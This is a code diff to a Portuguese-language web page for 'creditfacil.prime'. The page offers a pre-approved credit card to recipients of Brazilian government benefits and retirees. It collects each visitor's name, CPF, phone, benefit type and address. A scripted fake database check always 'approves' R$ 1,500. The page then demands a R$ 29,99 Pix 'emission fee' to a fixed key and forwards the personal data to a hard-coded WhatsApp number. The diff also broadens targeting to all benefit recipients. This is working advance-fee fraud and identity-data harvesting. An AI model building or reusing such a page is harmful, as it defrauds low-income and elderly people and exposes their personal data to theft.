@@ -56,7 +56,7 @@
   <div class="bg-gradient-to-r from-[#030b1b] via-[#0b1d3a] to-[#030b1b] border-b border-[#1e3a6e] py-2.5 px-4 text-center">
     <p class="text-xs font-semibold text-gray-200">
       <i class="fa-solid fa-circle-info text-[#00d2ff] mr-1.5"></i>
-      Cartão de Crédito Pré-Aprovado exclusivo para <span class="text-[#00d2ff] font-bold">Aposentados, Pensionistas e Beneficiários de Auxílios</span>.
+      Cartão de Crédito Pré-Aprovado exclusivo para <span class="text-[#00d2ff] font-bold">todos os Beneficiários de Auxílios do Governo</span>.
     </p>
   </div>
 
@@ -102,4 +102,206 @@
               <input type="text" id="input-cpf" required maxlength="14" placeholder="000.000.000-00" oninput="mascaraCpf(this)" class="w-full bg-[#030b1b] border border-[#1e3a6e] rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-[#00d2ff]" />
             </div>
             <div>
-              <label class="block text-[11px] font-bold uppercase tracking-wider text-gray-300 mb-1">WhatsApp
+              <label class="block text-[11px] font-bold uppercase tracking-wider text-gray-300 mb-1">WhatsApp de Contato</label>
+              <input type="text" id="input-tel" required placeholder="(00) 00000-0000" class="w-full bg-[#030b1b] border border-[#1e3a6e] rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-[#00d2ff]" />
+            </div>
+          </div>
+
+          <div>
+            <label class="block text-[11px] font-bold uppercase tracking-wider text-gray-300 mb-1">Qual benefício você recebe?</label>
+            <select id="input-beneficio" required class="w-full bg-[#030b1b] border border-[#1e3a6e] rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-[#00d2ff]">
+              <option value="" disabled selected>Selecione seu benefício...</option>
+              <option value="Bolsa Família">Bolsa Família / Auxílio Brasil</option>
+              <option value="BPC / LOAS">BPC / LOAS (Idoso ou Deficiência)</option>
+              <option value="Auxílio Gás">Auxílio Gás</option>
+              <option value="Pé-de-Meia">Pé-de-Meia</option>
+              <option value="Aposentado/Pensionista">Aposentado ou Pensionista INSS</option>
+              <option value="Outros Auxílios">Outros Auxílios Governamentais</option>
+            </select>
+          </div>
+
+          <div class="grid grid-cols-3 gap-3">
+            <div class="col-span-2">
+              <label class="block text-[11px] font-bold uppercase tracking-wider text-gray-300 mb-1">CEP de Entrega</label>
+              <input type="text" id="input-cep" required maxlength="9" placeholder="00000-000" class="w-full bg-[#030b1b] border border-[#1e3a6e] rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-[#00d2ff]" />
+            </div>
+            <div>
+              <label class="block text-[11px] font-bold uppercase tracking-wider text-gray-300 mb-1">Estado (UF)</label>
+              <input type="text" id="input-uf" required maxlength="2" placeholder="Ex: SP" class="w-full bg-[#030b1b] border border-[#1e3a6e] rounded-xl px-4 py-2.5 text-sm text-white uppercase focus:outline-none focus:border-[#00d2ff]" />
+            </div>
+          </div>
+
+          <div>
+            <label class="block text-[11px] font-bold uppercase tracking-wider text-gray-300 mb-1">Endereço Completo (Rua, Nº e Bairro)</label>
+            <input type="text" id="input-endereco" required placeholder="Ex: Rua das Flores, 123 - Centro" class="w-full bg-[#030b1b] border border-[#1e3a6e] rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-[#00d2ff]" />
+          </div>
+
+          <button type="submit" class="w-full py-4 rounded-xl pan-btn-primary text-sm uppercase tracking-wider flex items-center justify-center gap-2 mt-3">
+            <span>Consultar Limite Grátis</span>
+            <i class="fa-solid fa-arrow-right"></i>
+          </button>
+        </form>
+      </div>
+
+      <!-- ETAPA 2: CARREGAMENTO -->
+      <div id="step-2-content" class="hidden text-center py-10 space-y-4">
+        <div class="w-16 h-16 border-4 border-[#00d2ff]/30 border-t-[#00d2ff] rounded-full animate-spin mx-auto"></div>
+        <div>
+          <h3 class="text-lg font-bold text-white">Consultando Base de Dados...</h3>
+          <p class="text-xs text-gray-300 mt-1">Validando elegibilidade para liberação do Cartão de Crédito Pré-Aprovado.</p>
+        </div>
+      </div>
+
+      <!-- ETAPA 3: APROVADO + IMAGEM DO CARTÃO + PIX COM CHAVE OFICIAL E QR CODE -->
+      <div id="step-3-content" class="hidden space-y-5">
+        <div class="bg-[#00d2ff]/10 border border-[#00d2ff]/30 rounded-2xl p-4 text-center">
+          <span class="text-[10px] font-bold text-[#00d2ff] uppercase tracking-widest bg-[#00d2ff]/20 px-3 py-1 rounded-full inline-block mb-2">● Crédito Aprovado com Sucesso</span>
+          <p class="text-xs text-gray-200 font-medium">Limite pré-aprovado liberado em conta:</p>
+          <h3 class="text-3xl font-black text-white my-1">R$ 1.500,00</h3>
+          <p class="text-[11px] text-[#00d2ff]">Cartão Físico Personalizado com Entrega em até 15 Dias Úteis</p>
+        </div>
+
+        <!-- FOTO ILUSTRATIVA DO CARTÃO ENVIADO -->
+        <div class="rounded-2xl overflow-hidden border border-[#00d2ff]/40 shadow-xl bg-[#030b1b]">
+          <img src="WhatsApp Image 2026-10-30 at 16.14.09.jpeg" alt="Cartão de Crédito Creditfácil Prime" class="w-full h-auto object-cover" />
+          <div class="p-3 text-center bg-[#030b1b]/90 border-t border-[#1e3a6e]">
+            <span class="text-[10px] text-gray-400 uppercase tracking-widest block">Titular Aprovado:</span>
+            <span id="card-holder-name" class="text-sm font-bold text-[#00d2ff] uppercase">BENEFICIÁRIO APROVADO</span>
+          </div>
+        </div>
+
+        <div class="space-y-2 text-xs text-gray-300 bg-[#030b1b]/80 p-4 rounded-xl border border-[#1e3a6e]">
+          <div class="flex items-start gap-2.5">
+            <i class="fa-solid fa-check text-[#00d2ff] mt-0.5"></i>
+            <span>Sem consulta ao SPC / Serasa e sem burocracia.</span>
+          </div>
+          <div class="flex items-start gap-2.5">
+            <i class="fa-solid fa-check text-[#00d2ff] mt-0.5"></i>
+            <span>Aprovado para beneficiários de auxílios governamentais.</span>
+          </div>
+          <div class="flex items-start gap-2.5">
+            <i class="fa-solid fa-check text-[#00d2ff] mt-0.5"></i>
+            <span>Frete expresso via Correios (Prazo: até 15 dias úteis).</span>
+          </div>
+        </div>
+
+        <!-- Bloco de QR Code & Chave Pix Oficial -->
+        <div class="bg-[#030b1b] border border-[#1e3a6e] p-5 rounded-xl text-center space-y-4">
+          <div>
+            <h4 class="text-sm font-bold text-white">Garantir Emissão & Envio Expresso</h4>
+            <p class="text-[11px] text-gray-400 mt-0.5">Taxa única de emissão e postagem: <strong class="text-white">R$ 29,99</strong></p>
+          </div>
+
+          <!-- QR Code gerado dinamicamente com a chave Pix oficial -->
+          <div class="bg-white p-3 rounded-xl w-40 h-40 mx-auto flex items-center justify-center border-4 border-[#00d2ff]/20 shadow-md">
+            <img id="qr-code-img" src="" alt="QR Code Pix" class="w-full h-full object-contain" />
+          </div>
+
+          <!-- Campo Chave Pix Copia e Cola -->
+          <div class="space-y-1.5 text-left">
+            <label class="block text-[11px] font-bold uppercase tracking-wider text-gray-300">Chave Pix (Copia e Cola):</label>
+            <div class="flex items-center gap-2">
+              <input type="text" id="pix-key" readonly value="f3724243-ec65-482d-bd72-ccaacf909d42" class="w-full bg-[#051329] border border-[#1e3a6e] rounded-xl px-3 py-2 text-xs text-[#00d2ff] font-mono font-bold focus:outline-none" />
+              <button onclick="copiarChavePix()" class="bg-[#00d2ff] text-[#051329] font-bold px-3.5 py-2 rounded-xl text-xs hover:bg-[#00b4d8] transition flex items-center gap-1 shrink-0">
+                <i class="fa-solid fa-copy"></i>
+                <span id="btn-copiar-texto">Copiar</span>
+              </button>
+            </div>
+          </div>
+
+          <p class="text-[10px] text-gray-400">Escaneie o QR Code com o app do seu banco ou clique em "Copiar" para colar a chave Pix. Após o pagamento, envie o comprovante no WhatsApp.</p>
+          
+          <a id="whatsapp-btn" href="#" onclick="enviarWhatsApp(event)" target="_blank" class="block w-full text-center py-3.5 rounded-xl pan-btn-primary text-sm uppercase tracking-wider flex items-center justify-center gap-2">
+            <i class="fa-brands fa-whatsapp text-lg"></i>
+            <span>Enviar Dados e Comprovante no WhatsApp</span>
+          </a>
+        </div>
+
+      </div>
+
+    </div>
+
+  </main>
+
+  <!-- Rodapé -->
+  <footer class="w-full bg-[#030b1b] border-t border-[#1e3a6e] py-6 px-4 text-center text-xs text-gray-400 space-y-2">
+    <div class="max-w-xl mx-auto space-y-1">
+      <p class="font-bold text-gray-300">creditfacil.prime - Soluções Financeiras</p>
+      <p class="text-[11px] text-gray-400">Plataforma digital voltada à facilitação de crédito para beneficiários sociais.</p>
+      <p class="text-[10px] text-gray-400 pt-2">© 2026 creditfacil.prime. Todos os direitos reservados.</p>
+    </div>
+  </footer>
+
+  <!-- Scripts -->
+  <script>
+    function mascaraCpf(i) {
+      let v = i.value;
+      if (isNaN(v[v.length - 1])) {
+        i.value = v.substring(0, v.length - 1);
+        return;
+      }
+      i.setAttribute("maxlength", "14");
+      if (v.length == 3 || v.length == 7) i.value += ".";
+      if (v.length == 11) i.value += "-";
+    }
+
+    function copiarChavePix() {
+      const pixInput = document.getElementById('pix-key');
+      pixInput.select();
+      pixInput.setSelectionRange(0, 99999);
+      navigator.clipboard.writeText(pixInput.value);
+
+      const btnTexto = document.getElementById('btn-copiar-texto');
+      btnTexto.innerText = "Copiado!";
+      setTimeout(() => {
+        btnTexto.innerText = "Copiar";
+      }, 2500);
+    }
+
+    function handleNextStep(e) {
+      e.preventDefault();
+      
+      const nomeDigitado = document.getElementById('input-nome').value;
+      document.getElementById('card-holder-name').innerText = nomeDigitado || "BENEFICIÁRIO APROVADO";
+
+      // Gera o QR Code automaticamente com a sua chave Pix oficial
+      const chavePix = document.getElementById('pix-key').value;
+      const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(chavePix)}`;
+      document.getElementById('qr-code-img').src = qrCodeUrl;
+
+      document.getElementById('step-1-content').classList.add('hidden');
+      document.getElementById('step-2-content').classList.remove('hidden');
+
+      document.getElementById('badge-step-2').classList.add('bg-[#00d2ff]', 'text-[#051329]');
+      document.getElementById('badge-step-2').classList.remove('bg-[#1e3a6e]', 'text-gray-400');
+      document.getElementById('text-step-2').classList.add('text-white');
+
+      setTimeout(() => {
+        document.getElementById('step-2-content').classList.add('hidden');
+        document.getElementById('step-3-content').classList.remove('hidden');
+
+        document.getElementById('badge-step-3').classList.add('bg-[#00d2ff]', 'text-[#051329]');
+        document.getElementById('badge-step-3').classList.remove('bg-[#1e3a6e]', 'text-gray-400');
+        document.getElementById('text-step-3').classList.add('text-white');
+      }, 2500);
+    }
+
+    function enviarWhatsApp(e) {
+      e.preventDefault();
+      const nome = document.getElementById('input-nome').value;
+      const cpf = document.getElementById('input-cpf').value;
+      const tel = document.getElementById('input-tel').value;
+      const beneficio = document.getElementById('input-beneficio').value;
+      const cep = document.getElementById('input-cep').value;
+      const uf = document.getElementById('input-uf').value;
+      const endereco = document.getElementById('input-endereco').value;
+
+      const texto = `Olá! Realizei o pagamento da taxa de R$ 29,99 via Pix e quero emitir meu Cartão de Crédito Pré-Aprovado no creditfacil.prime.%0A%0A*Dados do Cliente:*%0A- Nome: ${nome}%0A- CPF: ${cpf}%0A- WhatsApp: ${tel}%0A- Benefício: ${beneficio}%0A%0A*Endereço de Entrega (Prazo: 15 dias úteis):*%0A- Endereço: ${endereco}%0A- CEP: ${cep} - UF: ${uf}%0A%0AEstou enviando o comprovante em anexo!`;
+      
+      const numeroWhatsApp = "5511958370146";
+      window.open(`https://api.whatsapp.com/send?phone=${numeroWhatsApp}&text=${texto}`, '_blank');
+    }
+  </script>
+
+</body>
+</html>
